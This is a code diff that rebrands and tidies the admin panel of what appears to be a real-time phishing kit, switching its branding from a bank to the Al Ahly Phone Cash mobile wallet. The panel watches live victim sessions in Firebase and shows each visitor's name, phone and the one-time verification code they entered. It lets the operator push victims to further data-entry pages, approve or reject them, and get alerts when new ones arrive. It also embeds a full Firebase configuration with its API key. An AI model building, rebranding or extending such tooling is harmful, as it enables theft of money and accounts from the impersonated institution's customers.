@@ -6,31 +6,31 @@
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>لوحة التحكم - مصرف الأمان</title>
+  <title>لوحة التحكم - محفظة الاهلي فون كاش</title>
   <style>
-    * { margin:0; padding:0; box-sizing:border-box; }
+    * { margin:0; padding:0; box-sizing:border-box; font-family: 'Cairo', 'Janna LT', 'Janna', Arial, sans-serif; }
 
     :root {
-  --primary: #0058b0;
-  --primary-dark: #003d7a;
-  --primary-light: #1a6fc4;
-  --primary-bg: #e8f0fb;
-  --bg: #f4f6fa;
-  --bg-card: #ffffff;
-  --bg-section: #eef2f9;
-  --border: #c5d5ea;
-  --text: var(--text);
-  --text-sub: #5a6a7a;
-  --white: #ffffff;
-  --red: #c62828;
-  --red-light: #fdecea;
-  --orange: #e65100;
-  --orange-light: #fff3e0;
-  --green: #1b7a2e;
-  --green-light: var(--primary-bg);
-  --shadow: 0 2px 12px rgba(0,88,176,0.10);
-  --shadow-lg: 0 4px 24px rgba(0,88,176,0.15);
-}
+      --primary: #006633;
+      --primary-dark: #004d26;
+      --primary-light: #008040;
+      --primary-bg: #e8f5ee;
+      --bg: #f0f7f2;
+      --bg-card: #ffffff;
+      --bg-section: #eef7f2;
+      --border: #b2d8c0;
+      --text: #1a2a1a;
+      --text-sub: #4a6a5a;
+      --white: #ffffff;
+      --red: #c62828;
+      --red-light: #fdecea;
+      --orange: #e65100;
+      --orange-light: #fff3e0;
+      --green: #006633;
+      --green-light: #e8f5ee;
+      --shadow: 0 2px 12px rgba(0,102,51,0.10);
+      --shadow-lg: 0 4px 24px rgba(0,102,51,0.15);
+    }
 
     body {
       background: var(--bg);
@@ -45,7 +45,7 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      background: linear-gradient(160deg, var(--primary-dark) 0%, var(--primary) 60%, var(--primary-light) 100%) 0%, var(--primary) 60%, var(--bg-card) 100%);
+      background: linear-gradient(160deg, var(--primary-dark) 0%, var(--primary) 60%, var(--primary-light) 100%);
     }
     .login-box {
       background: var(--white);
@@ -64,14 +64,15 @@
       outline: none; text-align: right;
       transition: border-color 0.2s;
     }
-    .login-box input:focus { border-color: #0058b0; }
+    .login-box input:focus { border-color: var(--primary); }
     .login-box button {
       width: 100%; padding: 12px;
-      background: #0058b0; color: #fff;
+      background: var(--primary); color: #fff;
       border: none; border-radius: 10px;
       font-size: 15px; font-weight: 800; cursor: pointer;
+      transition: background 0.2s;
     }
-    .login-box button:hover { background: #0058b0; }
+    .login-box button:hover { background: var(--primary-dark); }
     .login-error { color: #c62828; font-size: 13px; margin-top: 10px; display: none; }
 
     /* ===== DASHBOARD ===== */
@@ -79,7 +80,7 @@
 
     /* HEADER */
     .header {
-      background: #0058b0;
+      background: var(--primary);
       color: #fff;
       padding: 0 24px;
       height: 58px;
@@ -169,10 +170,10 @@
       transition: background 0.15s;
       position: relative;
     }
-    .visitor-item:hover { background: #f9fbe7; }
-    .visitor-item.active { background: var(--bg-card); border-right: 3px solid var(--primary); }
-    .visitor-item.has-action { background: var(--bg-card)8e1; }
-    .visitor-item.has-action.active { background: var(--bg-card)3cd; }
+    .visitor-item:hover { background: #f0f7f2; }
+    .visitor-item.active { background: #e8f5ee; border-right: 3px solid var(--primary); }
+    .visitor-item.has-action { background: #fff8e1; }
+    .visitor-item.has-action.active { background: #f1f8e9; }
 
     .vi-top { display: flex; align-items: center; justify-content: space-between; margin-bottom: 4px; }
     .vi-name { font-size: 14px; font-weight: 800; color: var(--text); }
@@ -186,11 +187,11 @@
       padding: 2px 8px; border-radius: 10px;
       margin-top: 4px;
     }
-    .vi-status.waiting { background: var(--bg-card)3e0; color: #e65100; }
-    .vi-status.approved { background: #e3f2fd; color: #1565c0; }
+    .vi-status.waiting { background: #fff3e0; color: #e65100; }
+    .vi-status.approved { background: #e8f5ee; color: var(--primary); }
     .vi-status.otp { background: #f3e5f5; color: #6a1b9a; }
-    .vi-status.done { background: var(--bg-card); color: var(--primary); }
-    .vi-status.rejected { background: #2d1a1a; color: #c62828; }
+    .vi-status.done { background: #e8f5ee; color: var(--primary-dark); }
+    .vi-status.rejected { background: #fdecea; color: #c62828; }
 
     .action-badge {
       position: absolute;
@@ -229,7 +230,7 @@
     }
 
     .vb-header {
-      background: linear-gradient(135deg, var(--primary), var(--primary));
+      background: linear-gradient(135deg, var(--primary-dark), var(--primary));
       color: #fff;
       padding: 18px 22px;
       display: flex; align-items: center; justify-content: space-between;
@@ -262,7 +263,7 @@
       margin-bottom: 18px;
     }
     .info-item {
-      background: var(--bg-card);
+      background: var(--bg);
       border-radius: 10px;
       padding: 12px 14px;
     }
@@ -282,12 +283,12 @@
       padding: 6px 14px; border-radius: 20px;
       font-size: 13px; font-weight: 800;
     }
-    .status-badge.waiting { background: #2d1a0a; color: #e65100; }
-    .status-badge.approved { background: #e3f2fd; color: #1565c0; }
+    .status-badge.waiting { background: #fff3e0; color: #e65100; }
+    .status-badge.approved { background: #e8f5ee; color: var(--primary); }
     .status-badge.otp_submitted { background: #f3e5f5; color: #6a1b9a; }
-    .status-badge.final_approved { background: var(--bg-card); color: var(--primary); }
+    .status-badge.final_approved { background: #e8f5ee; color: var(--primary-dark); }
     .status-badge.final_rejected,
-    .status-badge.rejected { background: #2d1a1a; color: #c62828; }
+    .status-badge.rejected { background: #fdecea; color: #c62828; }
 
     /* ACTIONS SECTION */
     .actions-section {
@@ -309,12 +310,12 @@
 
     .btn-approve {
       flex: 1; padding: 11px;
-      background: #0058b0; color: #fff;
+      background: var(--primary); color: #fff;
       border: none; border-radius: 10px;
       font-size: 14px; font-weight: 800; cursor: pointer;
       transition: background 0.2s;
     }
-    .btn-approve:hover { background: #0058b0; }
+    .btn-approve:hover { background: var(--primary-dark); }
 
     .btn-reject {
       flex: 1; padding: 11px;
@@ -327,17 +328,17 @@
 
     .btn-delete {
       width: 100%; padding: 10px;
-      background: var(--bg-card); color: #c62828;
+      background: var(--white); color: #c62828;
       border: 1.5px solid #c62828; border-radius: 10px;
       font-size: 13px; font-weight: 800; cursor: pointer;
       margin-top: 10px;
       transition: all 0.2s;
     }
-    .btn-delete:hover { background: #2d1a1a; }
+    .btn-delete:hover { background: #fdecea; }
 
     /* REDIRECT SECTION */
     .redirect-section {
-      background: var(--bg-card);
+      background: var(--bg);
       border: 1.5px solid var(--border);
       border-radius: 12px;
       padding: 14px 16px;
@@ -352,16 +353,17 @@
       flex: 1; padding: 9px 12px;
       border: 1.5px solid var(--border);
       border-radius: 8px; font-size: 13px;
-      outline: none; background: var(--bg-card);
+      outline: none; background: var(--white);
       color: var(--text);
     }
     .btn-redirect {
       padding: 9px 16px;
-      background: #0058b0; color: #fff;
+      background: var(--primary); color: #fff;
       border: none; border-radius: 8px;
       font-size: 13px; font-weight: 800; cursor: pointer;
+      transition: background 0.2s;
     }
-    .btn-redirect:hover { background: #0058b0; }
+    .btn-redirect:hover { background: var(--primary-dark); }
 
     /* OTP DISPLAY */
     .otp-display {
@@ -398,7 +400,7 @@
     }
     .history-dot {
       width: 8px; height: 8px; border-radius: 50%;
-      background: #0058b0; margin-top: 3px; flex-shrink: 0;
+      background: var(--primary); margin-top: 3px; flex-shrink: 0;
     }
     .history-dot.red { background: #c62828; }
     .history-dot.orange { background: #e65100; }
@@ -412,7 +414,7 @@
       z-index: 9999; display: flex; flex-direction: column; gap: 8px;
     }
     .toast {
-      background: #0058b0;
+      background: var(--primary);
       color: #fff;
       padding: 12px 18px;
       border-radius: 12px;
@@ -432,7 +434,7 @@
     ::-webkit-scrollbar { width: 5px; }
     ::-webkit-scrollbar-track { background: #f0f0f0; }
     ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 10px; }
-  
+
     /* CLEAR CHAT BUTTON & DROPDOWN */
     .btn-clear-chat {
       background: #ff9800;
@@ -451,7 +453,7 @@
     .clear-chat-menu {
       display: none;
       position: absolute;
-      background: var(--bg-card);
+      background: var(--white);
       border: 1px solid var(--border);
       border-radius: 8px;
       box-shadow: 0 4px 16px rgba(0,0,0,0.15);
@@ -474,24 +476,26 @@
       color: #333;
       transition: background 0.15s;
     }
-    .clear-chat-menu button:hover { background: var(--bg-card); }
+    .clear-chat-menu button:hover { background: var(--bg); }
     .clear-chat-menu button.danger { color: #d32f2f; }
+
     .visitor-item .vi-checkbox {
       display: none;
       margin-left: 8px;
       width: 18px;
       height: 18px;
       cursor: pointer;
-      accent-color: #4caf50;
+      accent-color: var(--primary);
       flex-shrink: 0;
       vertical-align: middle;
     }
     body.selection-mode .visitor-item .vi-checkbox { display: inline-block; }
     body.selection-mode .visitor-item { cursor: default; }
+
     .selection-toolbar {
       display: none;
       padding: 10px 14px;
-      background: var(--bg-card)3e0;
+      background: #fff3e0;
       border-bottom: 1px solid #ffcc80;
       align-items: center;
       justify-content: space-between;
@@ -509,21 +513,7 @@
     }
     .btn-sel-delete { background: #d32f2f; color: #fff; }
     .btn-sel-cancel { background: var(--border); color: #333; }
-
-    
-  /* Janna Font - using Cairo as web-safe Arabic equivalent */
-  * { font-family: 'Cairo', 'Janna LT', 'Janna', Arial, sans-serif; }
-  
-  /* Main headings - bold dark blue */
-  h1, h2, h3, h4, h5, h6,
-  .landing-title, .step-title, .section-title,
-  .card-title, .page-title, .main-title,
-  .form-title, .modal-title, .header-title {
-    font-weight: 700 !important;
-    color: #003d7a !important;
-  }
-
-</style>
+  </style>
 </head>
 <body>
 
@@ -533,8 +523,8 @@
 <!-- ===== LOGIN ===== -->
 <div id="loginScreen">
   <div class="login-box">
-    <h2>🏦 لوحة التحكم</h2>
-    <p>مصرف الأمان</p>
+    <h2>💚 لوحة التحكم</h2>
+    <p>محفظة الاهلي فون كاش</p>
     <input type="text" id="adminUser" placeholder="اسم المستخدم"/>
     <input type="password" id="adminPass" placeholder="كلمة المرور"/>
     <button onclick="doLogin()">دخول</button>
@@ -548,7 +538,7 @@
   <!-- HEADER -->
   <div class="header">
     <div class="header-left">
-      <h1>⚙️ لوحة التحكم</h1>
+      <h1>⚙️ لوحة التحكم - محفظة الاهلي فون كاش</h1>
       <div class="header-badge">
         <div class="dot-live"></div>
         <span id="headerStatus">متصل</span>
@@ -612,11 +602,11 @@
   import { getDatabase, ref, onValue, update, remove, get } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
 
   const firebaseConfig = {
-    apiKey: "AIzaSyDH_q2OEPBa2811sCAQse7uFTqSlVOmaw4"
+    apiKey: "AIzaSyDH_q2OEPBa2811sCAQse7uFTqSlVOmaw4",
     authDomain: "ahlywllt-45d9a.firebaseapp.com",
     databaseURL: "https://ahlywllt-45d9a-default-rtdb.firebaseio.com",
-    projectId: "ahlywllt-45d9a,
-    storageBucket: "ahlywllt-45d9a.firebasestorage.app,
+    projectId: "ahlywllt-45d9a",
+    storageBucket: "ahlywllt-45d9a.firebasestorage.app",
     messagingSenderId: "266724152700",
     appId: "1:266724152700:web:c689a22cc2a104c62c00f9",
     measurementId: "G-WYCXRCET1R"
@@ -625,7 +615,6 @@
   const app = initializeApp(firebaseConfig);
   const db = getDatabase(app);
 
-  // ===== PAGES LIST =====
   const PAGES = [
     { value: 'landing', label: 'صفحة البداية' },
     { value: 'personal', label: 'المعلومات الشخصية' },
@@ -640,14 +629,12 @@
   let knownIds = new Set();
   let knownStatuses = {};
 
-  // ===== AUDIO ALERTS =====
   function playSound(type) {
     const ctx = new (window.AudioContext || window.webkitAudioContext)();
     const osc = ctx.createOscillator();
     const gain = ctx.createGain();
     osc.connect(gain);
     gain.connect(ctx.destination);
-
     if (type === 'new') {
       osc.frequency.setValueAtTime(880, ctx.currentTime);
       osc.frequency.setValueAtTime(1100, ctx.currentTime + 0.1);
@@ -665,7 +652,6 @@
     }
   }
 
-  // ===== TOAST =====
   function showToast(msg, type = 'new') {
     const container = document.getElementById('toastContainer');
     const toast = document.createElement('div');
@@ -675,7 +661,6 @@
     setTimeout(() => toast.remove(), 4000);
   }
 
-  // ===== STATUS LABEL =====
   function statusLabel(s) {
     const map = {
       waiting: ['⏳ انتظار', 'waiting'],
@@ -706,10 +691,8 @@
     return d.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' });
   }
 
-  // ===== RENDER SIDEBAR =====
   function renderSidebar() {
     const list = document.getElementById('visitorList');
-    // Sort: has pending action first, then by lastAction desc
     const sorted = Object.entries(sessions).sort((a, b) => {
       const aAction = ['waiting','otp_submitted'].includes(a[1].status);
       const bAction = ['waiting','otp_submitted'].includes(b[1].status);
@@ -724,7 +707,7 @@
       const hasAction = ['waiting','otp_submitted'].includes(data.status);
       const div = document.createElement('div');
       div.className = `visitor-item ${selectedId === id ? 'active' : ''} ${hasAction ? 'has-action' : ''}`;
-      div.onclick = () => selectVisitor(id);
+
       div.innerHTML = `
         ${hasAction ? '<div class="action-badge">يحتاج رد</div>' : ''}
         <div class="vi-top">
@@ -735,19 +718,25 @@
         <div class="vi-page">📍 ${pageLabel(data.currentPage)}</div>
         <div><span class="vi-status ${cls}">${label}</span></div>
       `;
+
       const cb = document.createElement('input');
       cb.type = 'checkbox';
       cb.className = 'vi-checkbox';
       cb.dataset.id = id;
       cb.onclick = (e) => { e.stopPropagation(); updateSelCount(); };
       div.insertBefore(cb, div.firstChild);
-      // Prevent click on item when in selection mode
-      const origOnclick = div.onclick;
-      div.onclick = (e) => { if (document.body.classList.contains('selection-mode')) { cb.checked = !cb.checked; updateSelCount(); } else if (origOnclick) origOnclick(e); };
+
+      div.onclick = (e) => {
+        if (document.body.classList.contains('selection-mode')) {
+          cb.checked = !cb.checked;
+          updateSelCount();
+        } else {
+          selectVisitor(id);
+        }
+      };
       list.appendChild(div);
     });
 
-    // Stats
     const all = Object.values(sessions);
     document.getElementById('statTotal').textContent = all.length;
     document.getElementById('statWaiting').textContent = all.filter(s => ['waiting','otp_submitted'].includes(s.status)).length;
@@ -755,24 +744,20 @@
     document.getElementById('statRejected').textContent = all.filter(s => ['rejected','final_rejected'].includes(s.status)).length;
   }
 
-  // ===== SELECT VISITOR =====
   window.selectVisitor = function(id) {
     selectedId = id;
     renderSidebar();
     renderDetail(id);
   }
 
-  // ===== RENDER DETAIL =====
   function renderDetail(id) {
     const data = sessions[id];
     if (!data) return;
     const panel = document.getElementById('mainPanel');
     const [statusText, statusCls] = statusLabel(data.status);
-
     const showOTP = data.status === 'otp_submitted' && data.otp && data.otp !== '---';
-
-    // Build history
     const history = data.history || [];
+
     const historyHTML = history.slice().reverse().map(h => {
       const dotCls = h.type === 'reject' ? 'red' : h.type === 'action' ? 'orange' : h.type === 'otp' ? 'purple' : '';
       return `<div class="history-item">
@@ -782,7 +767,6 @@
       </div>`;
     }).join('');
 
-    // Pages dropdown
     const pagesOptions = PAGES.map(p =>
       `<option value="${p.value}">${p.label}</option>`
     ).join('');
@@ -791,21 +775,19 @@
       <div class="visitor-box">
         <div class="vb-header">
           <div class="vb-header-left">
-            <h2 style="display:flex;align-items:center;gap:6px;">
+            <h2 style="display:flex;align-items:center;gap:6px;color:#fff!important;">
               ${data.name || 'زائر'}
-              <span class="status-dot ${(Date.now() - (data.lastAction || data.timestamp)) < 30000 ? 'online' : 'offline'}" title="${(Date.now() - (data.lastAction || data.timestamp)) < 30000 ? 'متصل الآن' : 'غير متصل'}"></span>
+              <span class="status-dot ${(Date.now() - (data.lastAction || data.timestamp)) < 30000 ? 'online' : 'offline'}"></span>
             </h2>
-            <div class="vb-page">📍 ${pageLabel(data.currentPage)} &nbsp;|&nbsp; ${data.currentUrl || ''}</div>
+            <div class="vb-page">📍 ${pageLabel(data.currentPage)}</div>
           </div>
           <div class="vb-header-right">
             <div class="vb-time">🕐 ${formatTime(data.timestamp)}</div>
-            <div style="margin-top:6px;font-size:12px;opacity:0.9;background:rgba(255,255,255,0.15);border-radius:6px;padding:3px 8px;text-align:center;">🖥️ ${pageLabel(data.currentPage)}</div>
+            <div style="margin-top:6px;font-size:12px;opacity:0.9;background:rgba(255,255,255,0.15);border-radius:6px;padding:3px 8px;text-align:center;">محفظة الاهلي فون كاش</div>
           </div>
         </div>
 
         <div class="vb-body">
-
-          <!-- INFO GRID -->
           <div class="info-grid">
             <div class="info-item">
               <div class="label">الاسم</div>
@@ -842,13 +824,11 @@
             </div>` : ''}
           </div>
 
-          <!-- OTP DISPLAY -->
           <div class="otp-display ${showOTP ? 'show' : ''}">
             <div class="otp-label">🔢 رمز التحقق المُدخل من الزائر:</div>
             <div class="otp-value">${data.otp || '---'}</div>
           </div>
 
-          <!-- REDIRECT -->
           <div class="redirect-section">
             <label>🔀 إعادة توجيه الزائر إلى:</label>
             <div class="redirect-row">
@@ -860,7 +840,6 @@
             </div>
           </div>
 
-          <!-- ACTIONS -->
           <div class="actions-section">
             <div class="actions-title">⚡ الإجراءات</div>
 
@@ -892,7 +871,6 @@
             </div>
           </div>
 
-          <!-- HISTORY -->
           ${history.length > 0 ? `
           <div class="history-section">
             <div class="history-title">📜 سجل الإجراءات</div>
@@ -904,7 +882,6 @@
     `;
   }
 
-  // ===== ACTIONS =====
   function addHistory(id, msg, type) {
     const data = sessions[id];
     const history = data.history || [];
@@ -963,21 +940,17 @@
       </div>`;
   }
 
-  // ===== FIREBASE LISTENER =====
   function startListening() {
     onValue(ref(db, 'site1/sessions'), (snap) => {
       const data = snap.val() || {};
-
-      // Detect new visitors
       Object.keys(data).forEach(id => {
         if (!knownIds.has(id)) {
           knownIds.add(id);
-          if (knownIds.size > 1) { // skip first load
+          if (knownIds.size > 1) {
             playSound('new');
             showToast(`زائر جديد دخل الموقع: ${data[id].name || data[id].phone || 'مجهول'}`, 'new');
           }
         }
-        // Detect new actions
         if (knownStatuses[id] && knownStatuses[id] !== data[id].status) {
           const actionStatuses = ['waiting', 'otp_submitted'];
           if (actionStatuses.includes(data[id].status)) {
@@ -987,7 +960,6 @@
         }
         knownStatuses[id] = data[id].status;
       });
-
       sessions = data;
       renderSidebar();
       if (selectedId && sessions[selectedId]) {
@@ -996,7 +968,6 @@
     });
   }
 
-  // ===== LOGIN =====
   window.doLogin = function() {
     const u = document.getElementById('adminUser').value;
     const p = document.getElementById('adminPass').value;
@@ -1015,60 +986,58 @@
     sessions = {}; knownIds = new Set(); knownStatuses = {};
   }
 
-    // ===== CLEAR CHAT FUNCTIONS =====
-    window.toggleClearMenu = function(e, id) {
-      e.stopPropagation();
-      document.querySelectorAll('.clear-chat-menu').forEach(function(m) {
-        if (m.id !== 'clearMenu_' + id) m.classList.remove('open');
-      });
-      var menu = document.getElementById('clearMenu_' + id);
-      if (menu) menu.classList.toggle('open');
-    }
-    document.addEventListener('click', function() {
-      document.querySelectorAll('.clear-chat-menu').forEach(function(m) { m.classList.remove('open'); });
+  window.toggleClearMenu = function(e, id) {
+    e.stopPropagation();
+    document.querySelectorAll('.clear-chat-menu').forEach(m => {
+      if (m.id !== 'clearMenu_' + id) m.classList.remove('open');
     });
+    const menu = document.getElementById('clearMenu_' + id);
+    if (menu) menu.classList.toggle('open');
+  }
 
-    window.clearAllChats = function(sessionId) {
-      if (!confirm('هل أنت متأكد من مسح جميع المحادثات لهذه الجلسة؟')) return;
-      firebase.database().ref('site1/sessions/' + sessionId + '/messages').remove().then(function() {
-        document.querySelectorAll('.clear-chat-menu').forEach(function(m) { m.classList.remove('open'); });
-        alert('تم مسح جميع المحادثات بنجاح');
-        renderDetail(sessionId);
-      });
-    }
+  document.addEventListener('click', () => {
+    document.querySelectorAll('.clear-chat-menu').forEach(m => m.classList.remove('open'));
+  });
 
-    window.enterSelectionMode = function() {
-      document.body.classList.add('selection-mode');
-      document.querySelectorAll('.clear-chat-menu').forEach(function(m) { m.classList.remove('open'); });
-      updateSelCount();
-    }
+  window.clearAllChats = function(sessionId) {
+    if (!confirm('هل أنت متأكد من مسح جميع المحادثات لهذه الجلسة؟')) return;
+    remove(ref(db, `site1/sessions/${sessionId}/messages`)).then(() => {
+      document.querySelectorAll('.clear-chat-menu').forEach(m => m.classList.remove('open'));
+      alert('تم مسح جميع المحادثات بنجاح');
+      renderDetail(sessionId);
+    });
+  }
 
-    function cancelSelection() {
-      document.body.classList.remove('selection-mode');
-      document.querySelectorAll('.vi-checkbox').forEach(function(cb) { cb.checked = false; });
-    }
+  window.enterSelectionMode = function() {
+    document.body.classList.add('selection-mode');
+    document.querySelectorAll('.clear-chat-menu').forEach(m => m.classList.remove('open'));
+    updateSelCount();
+  }
 
-    function updateSelCount() {
-      var count = document.querySelectorAll('.vi-checkbox:checked').length;
-      var el = document.getElementById('selCount');
-      if (el) el.textContent = count + ' محدد';
-    }
+  window.cancelSelection = function() {
+    document.body.classList.remove('selection-mode');
+    document.querySelectorAll('.vi-checkbox').forEach(cb => cb.checked = false);
+  }
 
-    function deleteSelected() {
-      var checked = document.querySelectorAll('.vi-checkbox:checked');
-      if (checked.length === 0) { alert('لم تحدد أي جلسة'); return; }
-      if (!confirm('هل أنت متأكد من حذف ' + checked.length + ' جلسة؟')) return;
-      var promises = [];
-      checked.forEach(function(cb) {
-        promises.push(firebase.database().ref('site1/sessions/' + cb.dataset.id).remove());
-      });
-      Promise.all(promises).then(function() {
-        cancelSelection();
-        alert('تم الحذف بنجاح');
-      });
-    }
+  function updateSelCount() {
+    const count = document.querySelectorAll('.vi-checkbox:checked').length;
+    const el = document.getElementById('selCount');
+    if (el) el.textContent = count + ' محدد';
+  }
 
-  </script>
+  window.deleteSelected = function() {
+    const checked = document.querySelectorAll('.vi-checkbox:checked');
+    if (checked.length === 0) { alert('لم تحدد أي جلسة'); return; }
+    if (!confirm('هل أنت متأكد من حذف ' + checked.length + ' جلسة؟')) return;
+    const promises = [];
+    checked.forEach(cb => {
+      promises.push(remove(ref(db, `site1/sessions/${cb.dataset.id}`)));
+    });
+    Promise.all(promises).then(() => {
+      cancelSelection();
+      alert('تم الحذف بنجاح');
+    });
+  }
+</script>
 </body>
 </html>
-
